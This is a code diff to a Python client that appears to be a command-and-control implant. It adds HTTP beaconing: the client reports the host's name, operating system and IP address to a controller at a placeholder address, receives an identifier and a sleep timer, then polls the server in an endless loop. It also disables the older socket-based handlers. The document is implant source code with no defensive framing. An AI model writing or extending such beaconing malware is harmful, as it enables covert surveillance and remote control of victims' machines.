@@ -15,18 +15,21 @@ import hashlib
 import struct
 import platform
 import re
-import uuid
 import shutil
 import stat
 import pwd
 import grp
 import threading
+import json
+import http.client
+import urllib.parse
+from typing import Tuple
 from getpass import getuser
 from time import sleep
 from datetime import datetime
 
 
-address = "127.0.0.1", 1100
+address = "127.0.0.1", 80
 
 
 class Client:
@@ -523,16 +526,55 @@ processor = {platform.processor()}"""))
             message = "Error: This is not a directory"
         self.send_data(ssl_sock, message)  # send message over socket
 
+    def get_request(self, url: str) -> Tuple[int, str]:
+        parsed_url = urllib.parse.urlparse(url)
+        conn = http.client.HTTPConnection(parsed_url.netloc)
+        conn.request("GET", parsed_url.path + ("?" + parsed_url.query if parsed_url.query else ""))
+        response = conn.getresponse()
+        data = response.read().decode()
+        conn.close()
+
+        return response.status, data
+
+    def httpConnection(self) -> Tuple[int, str]:
+        """beacon to the server"""
+        r = self.get_request(f"http://{address[0]}:{address[1]}/connection?name={socket.gethostname()}&os={platform.system()}&address={socket.gethostbyname(socket.gethostname())}")
+        print(r)
+        if r[0] == 200:
+            data = json.loads(r[1])
+            return data['timer'], data['uuid']
+        else:
+            raise Exception(f"Failed to connect to server: {r[0]} {r[1]}")
+
+    def beacon(self, timer, id):
+        """beacon to the server"""
+        while True:
+            url = f"http://{address[0]}:{address[1]}/beacon?id={id}"
+            r = self.get_request(url)
+            print(r)
+            try:
+                data = json.loads(r[1])
+            except json.JSONDecodeError:
+                print("Failed to decode JSON response")
+                continue
+            if "timer" in data:
+                timer = data["timer"]
+                print(f"Sleeping for {timer} seconds")
+            sleep(int(timer))
+
+
 
 if __name__ == '__main__':
     try:
         client = Client()  # calls the client class
         while True:
-            client.socketinitilsation()  # starts socket
-            client.connection()
-            client.sendhostname()  # sends hostname
-            client.send_data(ssl_sock, "Python")
-            client.check_listener()  # checks listner
-            client.serverhandler()  # starts server handler
+            # client.socketinitilsation()  # starts socket
+            # client.connection()
+            timer, id = client.httpConnection()
+            client.beacon(timer, id)
+            # client.sendhostname()  # sends hostname
+            # client.send_data(ssl_sock, "Python")
+            # client.check_listener()  # checks listner
+            # client.serverhandler()  # starts server handler
     except KeyboardInterrupt:
         print("exit")
